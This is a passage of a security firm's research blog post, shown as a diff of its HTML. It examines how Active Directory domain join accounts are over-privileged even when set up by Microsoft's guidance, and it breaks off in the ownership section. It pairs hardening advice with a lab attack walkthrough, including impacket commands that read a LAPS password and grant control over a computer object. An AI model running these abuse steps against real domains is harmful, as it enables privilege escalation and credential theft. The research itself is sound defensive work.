@@ -1,0 +1,1945 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academia 4.3.1">
+  <meta name="theme-name" content="academia-hugo"/>
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  
+
+  
+  
+  
+    
+  
+  <meta name="description" content="The post walks through the usage and the security considerations of domain join accounts used in Active Directory">
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/">
+
+  
+
+
+  
+
+  
+  
+  
+  <meta name="theme-color" content="#000000">
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.0/css/all.css" integrity="sha384-aOkxzJ5uQz7WBObEZcHvV5JvRW3TUc2rNPA7pe3AwnsUohiw1Vj2Rgx2KSOkF5+h" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" integrity="sha256-ygkqlh3CYSUri3LhQxzdcm0n1EQvH2Y+U5S2idbLtxs=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/github.min.css" crossorigin="anonymous" title="hl-light">
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" disabled>
+        
+      
+    
+
+    
+
+    
+
+  
+
+  
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Open+Sans|Roboto+Mono&display=swap">
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/css/academia.min.d29584a8d689167dc15889efc8f9006e.css">
+
+  
+
+  
+  
+  
+  
+
+  
+
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="icon" type="image/png" href="/img/icon.png">
+  <link rel="apple-touch-icon" type="image/png" href="/img/icon-192.png">
+
+  <link rel="canonical" href="https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/">
+
+  
+  
+  
+  
+    
+  
+  <meta property="twitter:card" content="summary_large_image">
+  
+  <meta property="og:site_name" content="Shelltrail - Swedish offensive security experts">
+  <meta property="og:url" content="https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/">
+  <meta property="og:title" content="Active Directory domain (join)own accounts revisited 2025 | Shelltrail - Swedish offensive security experts">
+  <meta property="og:description" content="The post walks through the usage and the security considerations of domain join accounts used in Active Directory"><meta property="og:image" content="https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/featured.png">
+  <meta property="twitter:image" content="https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/featured.png"><meta property="og:locale" content="en-us">
+  
+  <meta property="article:published_time" content="2025-10-08T00:00:00&#43;00:00">
+  
+  <meta property="article:modified_time" content="2025-10-08T00:00:00&#43;00:00">
+  
+
+  
+
+
+  
+
+
+
+
+
+  <title>Active Directory domain (join)own accounts revisited 2025 | Shelltrail - Swedish offensive security experts</title>
+
+</head>
+
+
+<body id="top" data-spy="scroll" data-target="#TableOfContents" data-offset="71" >
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+
+<nav class="navbar navbar-light fixed-top navbar-expand-lg py-0" id="navbar-main">
+  <div class="container">
+
+    
+      <a class="navbar-brand" href="/"><img src="/img/shelltrail_slim_transparent.png" height="90%" width="90%" alt="Shelltrail - Swedish offensive security experts"></a>
+      
+      <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation"><span><i class="fas fa-bars"></i></span>
+      </button>
+      
+
+    
+    <div class="collapse navbar-collapse" id="navbar">
+      
+      
+      <ul class="navbar-nav ml-auto">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#proposal"><span>Proposal</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#webshop"><span>Webshop</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#services"><span>Services</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>About us</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#research"><span>Research</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#blog"><span>Blog</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+
+        
+
+        
+
+        
+
+      </ul>
+    </div>
+  </div>
+</nav>
+
+
+  <article class="article py-5" itemscope itemtype="http://schema.org/Article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="container split-header">
+  <div class="row justify-content-center">
+    <div class="col-lg-12">
+        <img class="img-fluid w-100" src="/research/active-directory-domain-ownjoin-accounts-revisited/featured_hua4b5ecb2a934598427015266f53c5780_174030_900x500_fill_q90_lanczos_center_3.png" itemprop="image" alt="">
+        
+    </div>
+    <div class="col-lg-12">
+      <h1 itemprop="name">Active Directory domain (join)own accounts revisited 2025</h1>
+
+      
+
+      
+
+
+
+<meta content="2025-10-08 00:00:00 &#43;0000 UTC" itemprop="datePublished">
+<meta content="2025-10-08 00:00:00 &#43;0000 UTC" itemprop="dateModified">
+
+<div class="article-metadata">
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+    
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/&amp;text=Active%20Directory%20domain%20%28join%29own%20accounts%20revisited%202025" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/&amp;t=Active%20Directory%20domain%20%28join%29own%20accounts%20revisited%202025" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook-f"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=Active%20Directory%20domain%20%28join%29own%20accounts%20revisited%202025&amp;body=https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/&amp;title=Active%20Directory%20domain%20%28join%29own%20accounts%20revisited%202025" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://web.whatsapp.com/send?text=Active%20Directory%20domain%20%28join%29own%20accounts%20revisited%202025%20https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://www.shelltrail.com/research/active-directory-domain-ownjoin-accounts-revisited/&amp;title=Active%20Directory%20domain%20%28join%29own%20accounts%20revisited%202025" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+
+</div>
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+    
+    </div>
+  </div>
+</div>
+
+
+  <div class="article-container">
+
+    <div class="article-style" itemprop="articleBody">
+      
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/styles/atom-one-dark.min.css">
+
+
+<h2 id="tldr">TL;DR</h2>
+<p>Domain join accounts are frequently exposed during build processes, and even
+when following Microsoft&rsquo;s current guidance they inherit over-privileged ACLs
+(ownership, read-all, account restrictions) that enable Legacy-LAPS disclosure, RBCD <!-- raw HTML omitted -->
+and other high-impact abuses.</p>
+<p>Hardening requires layering controls such as disallowing low privileged users to
+create machine accounts and ensure that Domain Admins own joined computer objects. In
+addition, add deny ACEs for Legacy-LAPS (<code>ms-Mcs-AdmPwd</code>) and RBCD
+(<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>) while scoping create/delete rights
+to specific OUs.</p>
+<p>Even with those mitigations, reset-password rights can be weaponised via
+replication lag plus AD CS to recover the pre-reset machine secret.</p>
+<p>Dig into this post to see the lab walkthroughs, detection pointers and scripts
+that back these claims.</p>
+<h2 id="the-problem-with-domain-join-accounts">The problem with domain join accounts</h2>
+<p>During Shelltrail&rsquo;s many <a href="/cyber-security-services/internal-and-active-directory-penetration-test/">Active Directory Security Assessments</a>
+13 times out of 12 we end up compromising the Active Directory some way or
+another through the <em>Active Directory domain join</em>-account. By the looks of it,
+this account is nothing fancy. It is a regular active directory user account
+which is provided some additional permissions in order to create computer
+accounts and join/re-join computers to the Active Directory domain.</p>
+<p>The reason it is such a common way to compromise the Active Directory is
+the combination of its exposure and the way Access Control Entries (ACE) works in Active Directory.</p>
+<p><strong>Think about it</strong>; a Help Desk technician opens a Lenovo
+box, pulls out a brand new laptop. PXE boots the machine, hits F12, chooses
+<em>Windows 11</em>, grabs a cup of coffee and a croissant, then 45 minutes later
+the laptop is fully installed, joined to the domain and set up with all
+enterprise tooling.</p>
+<p>The Laptop here is an unauthenticated device, i.e., an unauthenticated attack
+perspective. And it is handed the plain-text password of the domain join account
+in order to join the domain. This basically means that an attacker on the internal
+network of a company is one press of F12 away from the domain join account&rsquo;s password.</p>
+<h2 id="the-exposure-of-domain-join-accounts">The exposure of domain join accounts</h2>
+<p>There are multiple ways of gaining access to the domain join account and the
+following list highlights a few:</p>
+<ul>
+<li>PXE boot and task sequences</li>
+<li>unattend.xml files</li>
+<li>MDT CustomSettings.ini</li>
+<li>bat, cmd or ps1 scripts stored in Configuration Managers <code>CMSources</code></li>
+<li>Stored in configuration files obtained with <a href="/research/cmloot/">cmloot.py</a></li>
+</ul>
+<h2 id="previous-research">Previous research</h2>
+<p>Shelltrail&rsquo;s pentester Andreas Vikerup has previously researched
+the problems with Active Directory domain join accounts which highlighted
+that ACEs in Active Directory tied to domain join accounts behave in unexpected ways
+and most often result in over-privileged permissions when attempting
+to configure or limit them.</p>
+<p>Trusted, good sources for gaining information on how to configure
+the domain join permissions have been sparse. This led to contacting
+Microsoft Security Response Center (MSRC)
+in an attempt to encourage Microsoft themselves to provide good security guidelines.</p>
+<p>Microsoft&rsquo;s response back in October 2021 was:</p>
+<blockquote>
+<p><em>Hello,</em></p>
+<p><em>We have completed our investigation and determined that this issue does not meet MSRC&rsquo;s bug bar for a security update.</em></p>
+</blockquote>
+<p>This led administrators to rely on blogs and other unverified sources to
+set up one of the most exposed Active Directory accounts in their environment.</p>
+<h2 id="4-years-later">4 years later&hellip;</h2>
+<p>By chance, this came up during a Google search (article date 25th Aug 2025):</p>
+<p><img src="active-directory-domain-join-account-permission-from-google.png" alt="active-directory-domain-join-account-permission-from-google.png"></p>
+<p>We acknowledge and know that managing domain join account permissions is hard -
+but Shelltrail is very happy that Microsoft takes action and provides guidance in
+this matter.</p>
+<p>The continuation of this article will put to the test the recommendations that
+Microsoft highlight. Follow along!</p>
+<h2 id="the-domain-join-account">The domain join account</h2>
+<p>By default both regular users and high-privilege users (Domain Admins) are allowed
+to join computers to the domain. Regular users are however capped to joining
+maximum 10 machines.</p>
+<p>When a regular user joins a computer to the domain (in other words: creates a new computer object)
+the owner of the object will default to <code>Domain Admins</code>. The same concept also applies
+when a high-privileged user joins a computer.</p>
+<p>Note that we do not want to
+use high privileged accounts for domain join actions as this username and
+password must be stored and pushed to the devices if for instance Configuration
+Manager is used to deploy operating systems.</p>
+<p>But using a regular, default configured, user account for domain join actions
+will quickly reach the cap of 10 machine accounts.</p>
+<p>To solve this - a specially configured Active Directory user account should be created
+and used in task sequences - we will call this the <em>domain join</em>-account.</p>
+<h2 id="machine-account-quota">Machine Account Quota</h2>
+<p>All information in this article will be summarized in the end in a nice, neat
+to-do list which should help create a reasonably secure domain join account.</p>
+<p>But first off, we need to address the limit of 10 computer accounts which in
+Active Directory is controlled by the <code>ms-DS-MachineAccountQuota</code>. This
+is recommended to be set to 0, which limits any low privileged account to
+create computer objects and thereby mitigating multiple attack vectors
+that requires computer accounts. This setting is not covered in <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/active-directory-domain-join-permissions">Microsoft&rsquo;s Active Directory domain join permissions article</a> but for the completeness of this guide
+we will include it:</p>
+<pre tabindex="0"><code>Set-ADDomain -Identity test.local -Replace @{ &#39;ms-DS-MachineAccountQuota&#39; = 0 } -Verbose
+VERBOSE: Performing the operation &#34;Set&#34; on target &#34;DC=test,DC=local&#34;.
+</code></pre><p>Awesome, now only the following users can create new computer objects:</p>
+<ul>
+<li>Users in the Administrators or Domain Administrators groups.</li>
+<li>Users who have delegated permissions on containers in Active Directory to create and delete computer accounts.</li>
+</ul>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/test-lowpriv:$PASS -computer-name NEWCOMPUTER\$ -computer-pass Abcdef12345
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies
+
+[-] Authenticating account&#39;s machine account quota exceeded!
+</code></pre><h2 id="understanding-microsofts-domain-join-article">Understanding Microsoft&rsquo;s domain join article</h2>
+<p>Begin with reading through the full article <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/active-directory-domain-join-permissions">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/active-directory-domain-join-permissions</a>.</p>
+<p>Then we&rsquo;ll discuss the necessary parts, namely the two scenarios:</p>
+<p><strong>Scenario 1: Permissions for creating computer accounts,</strong></p>
+<blockquote>
+<p>This scenario applies when users join their own computers to the domain
+without prior provisioning of computer accounts. During domain join, if the
+computer account with the name you&rsquo;re joining doesn&rsquo;t exist in AD, the system
+creates it using an Ldap_Add() operation, performed with the provided user
+credentials. To learn more, see NetJoinDomain function (lmjoin.h). The user
+joining the computer must either have the Add workstations to domain user
+right (also known as SeMachineAccountPrivilege, managed by Ms-Ds-Machine-Account-Quota),
+or permission to create computer objects in the organizational unit (OU) or
+container where the account is created. Because of the vulnerabilities
+described in <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/add-workstations-to-domain">Add workstations to domain</a>, Microsoft doesn&rsquo;t recommend using this option.</p>
+</blockquote>
+<p>This basically explains that low privileged users should not be allowed to create
+computer accounts as it introduces security risks.
+This is exactly what we mitigated with the <code>MachineAccountQuota</code>
+setting. Well done friend, we are one step ahead.</p>
+<p><strong>Scenario 2: Reusing computer accounts during domain join,</strong></p>
+<blockquote>
+<p>A more common scenario involves domain joining a device with a precreated computer account. For example, Admin01 at contoso.com has the Create Computer Account permissions on <code>OU=Workstations,DC=Contoso,DC=com</code></p>
+</blockquote>
+<p><em>A more common scenario</em> is up for discussion. Pre-creating all computer accounts
+creates more overhead prior to deploying machines. Well well, let&rsquo;s continue.</p>
+<blockquote>
+<p><code>Admin01</code> creates a computer account in the Workstations OU called NewPC1 and <code>Admin02</code> needs to join this computer to the domain during the build process. In cases where troubleshooting is necessary, such as when <code>Admin03</code> needs to unjoin and rejoin a computer, the preexisting account eases this process.</p>
+</blockquote>
+<p>So the recommended approach is to use three accounts for our operating system deployment now?</p>
+<ul>
+<li>Admin01 - To pre create computer accounts</li>
+<li>Admin02 - To join computers to the domain (What we call domain join account in this article)</li>
+<li>Admin03 - To unjoin/rejoin machines to the domain</li>
+</ul>
+<blockquote>
+<p>When an account with the name NewPC1$ exists in AD, an Ldap_modify() operation is executed using the credentials of the user handling the join, like <code>Admin02@contoso.com</code>.</p>
+</blockquote>
+<p>This tells us that our domain join account needs modify rights on the computer objects
+in Active Directory.</p>
+<blockquote>
+<p>When you perform the offline domain join process (<code>djoin /requestODJ</code>), the join doesn&rsquo;t require any permissions on the computer account in AD. This method is recommended because it minimizes required AD privileges and reduces potential issues.</p>
+</blockquote>
+<p>The previous excerpt is interesting. Microsoft recommends usage of offline domain join (ODJ).
+This scenario requires a user to pre-creating the computer
+object in Active Directory, where the user would be our domain join account. While creating
+the object, a random 120
+character password is set as the machine account password. This password, as well as
+other domain specific information is stored in a base64 encoded blob.
+A <code>djoin.exe</code> command together with the base64 blob
+can join a workgroup computer to the Active Directory. Meaning that no
+permissions are needed during this scenario, at least not during the
+time of the join action. We will not delve further into
+this topic but it could be a fun research project ahead.</p>
+<p>As far as we know there is no official support to integrate offline domain join and the
+automatic pre-creating of computer objects in Configuration Manager task sequences.
+Until then, we will not consider this option for an operative system deployment
+process.</p>
+<blockquote>
+<p>To successfully reuse an existing computer account during domain join, ensure the following permissions are assigned:</p>
+<ul>
+<li><strong>Trusted Ownership</strong>: The computer account owner (Admin01) must be a member of the Administrators group, either directly or through nested group membership. Alternatively, the user performing the domain join (Admin01) must be the account owner. If KB5020276 - Netjoin: Domain join hardening changes is installed, the owner (Admin01) or a group that includes Admin01 must be listed as a trusted owner in the ComputerAccountReuseAllowlist Group Policy Object (GPO) as described in the KB.</li>
+</ul>
+</blockquote>
+<p>Ah, <strong>ownership</strong>. This is the main fundamental issue with domain join accounts
+that was reported to Microsoft back in 2022. More on this later.</p>
+<p>The rest of the article states permissions to successfully join a computer to
+the domain using an existing account.</p>
+<h2 id="following-microsoft-permission-guidelines">Following Microsoft permission guidelines</h2>
+<p>First off we need to create our dedicated domain join user:</p>
+<p><img src="create-new-active-directory-domain-join-account.png" alt="create-new-active-directory-domain-join-account.png"></p>
+<p>We will follow <em>Scenario 2</em> in Microsoft&rsquo;s guidelines as we want to be able
+to reinstall machines with our Configuration Manager environment.</p>
+<p>We assign all of these permissions to <code>CN=Computers,OU=test,OU=local</code> and limit the
+assignments to <code>Descendant Computer Objects</code>:</p>
+<ul>
+<li>Read all properties</li>
+<li>List contents
+<ul>
+<li><img src="permissions-1.png" alt="permissions-1.png"></li>
+</ul>
+</li>
+<li>Change password</li>
+<li>Reset password
+<ul>
+<li><img src="permissions-2.png" alt="permissions-2.png"></li>
+</ul>
+</li>
+<li>Write account restrictions (for updating UserAccountControl)
+<ul>
+<li><img src="permissions-3.png" alt="permissions-3.png"></li>
+</ul>
+</li>
+<li>Validated write to DNS host name</li>
+<li>Validated write to service principal name
+<ul>
+<li><img src="permissions-4.png" alt="permissions-4.png"></li>
+</ul>
+</li>
+<li>Allowed to authenticate
+<ul>
+<li><img src="permissions-5.png" alt="permissions-5.png"></li>
+</ul>
+</li>
+<li>Write computername (pre-Windows 2000)
+<ul>
+<li><img src="permissions-6.png" alt="permissions-6.png"></li>
+</ul>
+</li>
+<li>Write displayname (Not found ACE - skipping)</li>
+<li>Write description
+<img src="permissions-7.png" alt="permissions-7.png"></li>
+</ul>
+<p>We test out our assigned permissions with <code>addcomputer.py</code> from impacket:</p>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name NEWCOMPUTER\$
+Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies
+
+[-] Authenticating account&#39;s machine account quota exceeded!
+</code></pre><p>Remember?:</p>
+<blockquote>
+<p>The user joining the computer must either have the Add workstations to domain user right (also known as SeMachineAccountPrivilege)</p>
+</blockquote>
+<p>We must now choose whether deletion of computer accounts should be delegated to
+our domain join account. If we allow it - the account will be able to unjoin machines
+from the domain and clean up afterwards as well - however this also allows an
+attacker to wipe all computer accounts if the domain join account should be
+compromised. We aim for a hardened environment and thereby do not allow
+deletion of accounts:</p>
+<p><img src="create-workstations.png" alt="create-workstations.png"></p>
+<p>All permissions assigned to an object in Active Directory is stored in the <code>nTSecurityDescriptor</code>:</p>
+<pre tabindex="0"><code>user@adpen1:~$ pyldapsearch test.local/domainjoin:$PASS &#39;(&amp;(objectcategory=container)(name=Computers))&#39; -attributes nTSecurityDescriptor
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] pyldapsearch v0.1.7 - Tw1sm
+
+[*] Binding to test.local
+[*] Distinguished name: DC=test,DC=local
+[*] Filter: (&amp;(objectcategory=container)(name=Computers))
+[*] Returning specific attributes(s): nTSecurityDescriptor
+--------------------
+nTSecurityDescriptor: AQAEjMAMAADcDAAAAAAAABQAAAAEAKwMPQAAAAUKSAAAAQAAAwAAAFMacqsvHtARmBkAqgBAUpuGepa/5g3QEaKFAKoAMEniAQUAAAAAAAUVAAAAcafBLzep2eUtpPgmZAQAAAUKSAAAAQAAAwAAAHCVKQBtJNA....
+</code></pre><p>The <code>nTSecurityDescriptor</code> stores its data in binary (SDDL) format which is not
+human readable. However @p0dalirius has created <a href="https://github.com/p0dalirius/pyDescribeNTSecurityDescriptor">pyDescribeNTSecurityDescriptor</a> to parse the data, which comes in
+handy when reviewing ACLs with python:</p>
+<pre tabindex="0"><code>user@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=computers,DC=test,
+[&gt;] Try to authenticate as &#39;test.local\domainjoin&#39; on None ...
+001. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Control Access on my Extended Right USER_CHANGE_PASSWORD (inherited from the LDAP Attribute computer), by inheritance.
+002. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Control Access on my Extended Right USER_FORCE_CHANGE_PASSWORD (inherited from the LDAP Attribute computer), by inheritance.
+003. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Control Access on my Extended Right ALLOWED_TO_AUTHENTICATE (inherited from the LDAP Attribute computer), by inheritance.
+004. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write Extended Properties on my Property Set DNS_HOST_NAME_ATTRIBUTES (inherited from the LDAP Attribute computer), by inheritance.
+005. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write Extended Properties on my LDAP Attribute servicePrincipalName (inherited from the LDAP Attribute computer), by inheritance.
+008. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my LDAP Attribute description (inherited from the LDAP Attribute computer), by inheritance.
+009. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS (inherited from the LDAP Attribute computer), by inheritance.
+010. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Create Child on my LDAP Attribute computer, by inheritance.
+017. &#39;TEST.LOCAL\domainjoin&#39; is allowed to List Contents, Read on me (inherited from the LDAP Attribute computer), by inheritance.
+</code></pre><p>A couple of improvements were done in <code>pyDescribeNTSecurityDescriptor</code>
+during this research. <a href="https://github.com/p0dalirius/pyDescribeNTSecurityDescriptor/compare/main...vikerup:pyDescribeNTSecurityDescriptor:misc-improvements">View here</a>.</p>
+<p>We test to add a computer to the domain again:</p>
+<pre tabindex="0"><code>user@adpen1:~$ addcomputer.py test.local/domainjoin:$PASS -computer-name NEWCOMPUTER\$
+Impacket v0.13.0.dev0+20250611.105641.0612d078 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully added machine account NEWCOMPUTER$ with password KvgMCaWyA1dyNFHIsVTsLrMABdCdiPiN.
+</code></pre><p>Perfect. We now have the ability to join the domain.</p>
+<p>But even though we have followed the best practices, the permissions we now have assigned
+our domain join account is over privileged and if a compromise of this account
+occurs the attacker will have multiple ways of compromise the chosen targets.</p>
+<p>Let&rsquo;s step through them one by one highlighting the risk of each permission, and
+attempt to provide mitigating factors.</p>
+<h2 id="read-all-properties">Read all properties</h2>
+<p>Easy to exploit. Reading all properties means that we can read the Legacy-LAPS password
+if present from the <code>ms-Mcs-AdmPwd</code> attribute:</p>
+<pre tabindex="0"><code>user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200
+Type help for list of commands
+
+# get_laps_password NEWCOMPUTER$
+Found Computer DN: CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local
+LAPS Password: lwNImJjCtsjKeXmldLVm/zJwSoiGItpi
+</code></pre><p>Agreed that the domain join account should have read permissions on the
+object but all properties - including sensitive ones seem overpowered.</p>
+<p>So we remove <code>Read all properties</code> from our delegate permissions.</p>
+<p>A note on <code>ldap_shell.py</code>. @PShlyundin has a fork of <a href="https://github.com/PShlyundin/ldap_shell">ldap_shell</a> in an external repo of impacket. During this research me and my friend
+Chad Gepete rewrote the client from scratch and sent a <a href="https://github.com/fortra/impacket/pull/2057">pull request to impacket&rsquo;s main project</a>. Previously <code>ldap_shell</code> was a class in impacket
+which only was accessible by running for instance <code>ntlmrelayx.py</code> and initiating
+a <code>smbclient.py</code> to 127.0.0.1 in order to reach the interactive <code>ldap_shell</code> menu.
+Not anymore.</p>
+<h2 id="ownership">Ownership</h2>
+<p>As we have delegated permission specifically to our domain join account
+to allow creation of computer objects a key difference in the ownership of
+the computer account occurs. If a high privileged user has joined the computer
+to the domain, <code>Domain Admins</code> becomes the owner:</p>
+<p><img src="domain-admins-ownership.png" alt="domain-admins-ownership.png"></p>
+<p>If however a domain join account has been delegated permission to join the
+computer it itself becomes the owner:</p>
+<p><img src="domainjoiner-ownership.png" alt="domainjoiner-ownership.png"></p>
+<p>This is simple to exploit as you can now assign yourself full rights to the
+computer object and perform Legacy-LAPS read, Resource Based Constrained Delegation (RBCD)
+or Shadow Credentials:</p>
+<pre tabindex="0"><code>user@adpen1:~$ ldap_shell.py test.local/domainjoin:$PASS@100.64.5.200
+Type help for list of commands
+
+# grant_control NEWCOMPUTER$ domainjoin
+Resolved &#39;domainjoin&#39; to &#39;S-1-5-21-801220465-3856247095-653829165-1124&#39;
+Resolved &#39;(sAMAccountName=NEWCOMPUTER$)&#39; to &#39;CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local&#39;
+DACL modified successfully!
+&#39;domainjoin&#39; now has control of &#39;CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local&#39;
+</code></pre><p>The ownership of a machine is represented by the last line (<code>Write Extended Properties on my Property Set DS_VALIDATED_WRITE_COMPUTER</code>, which was added to the <code>DescribeNTSecurityDescriptor.py</code> in commit <a href="https://github.com/vikerup/pyDescribeNTSecurityDescriptor/commit/082d0944283700aae41aafa317a20349d446a72e">082d094</a>):</p>
+<pre tabindex="0"><code>user@adpen1:~$ DescribeNTSecurityDescriptor.py -u domainjoin -p $PASS -d test.local --summary -D CN=NEWCOMPUTER,CN=Computers,DC=test,DC=local | grep domainjoin
+[&gt;] Try to authenticate as &#39;test.local\domainjoin&#39; on None ...
+001. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my Property Set LOGON_INFORMATION (inherited from the LDAP Attribute computer), by inheritance.
+002. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my LDAP Attribute description (inherited from the LDAP Attribute computer), by inheritance.
+003. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my LDAP Attribute displayName (inherited from the LDAP Attribute computer), by inheritance.
+004. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my LDAP Attribute sAMAccountName (inherited from the LDAP Attribute computer), by inheritance.
+005. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write Extended Properties on my Property Set DNS_HOST_NAME_ATTRIBUTES, by inheritance.
+006. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write Extended Properties on my LDAP Attribute servicePrincipalName, by inheritance.
+007. &#39;TEST.LOCAL\domainjoin&#39; is allowed to Write on my Property Set ACCOUNT_RESTRICTIONS, by inheritance.
+015. &#39;TEST.LOCAL\domainjoin&#39; is allowed to List Contents, Read, Delete Tree, List Object, Control Access, Delete, Read Control on me, by inheritance.
